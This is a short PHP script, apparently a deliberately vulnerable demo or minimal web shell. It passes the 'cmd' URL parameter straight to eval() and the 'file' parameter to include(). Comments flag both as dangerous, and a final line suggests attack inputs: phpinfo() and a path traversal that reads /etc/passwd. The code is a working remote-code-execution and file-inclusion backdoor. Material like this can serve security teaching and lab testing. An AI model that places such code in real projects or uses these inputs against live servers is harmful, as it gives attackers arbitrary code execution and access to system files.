<?php
// Remote Code Execution
if (isset($_GET['cmd'])) {
    eval($_GET['cmd']); // Dangerous: Executes arbitrary code
}

// File Inclusion
if (isset($_GET['file'])) {
    include($_GET['file']); // Dangerous: Allows file inclusion attacks
}

// Example Usage
echo "Pass ?cmd=phpinfo(); or ?file=../../etc/passwd";
?>
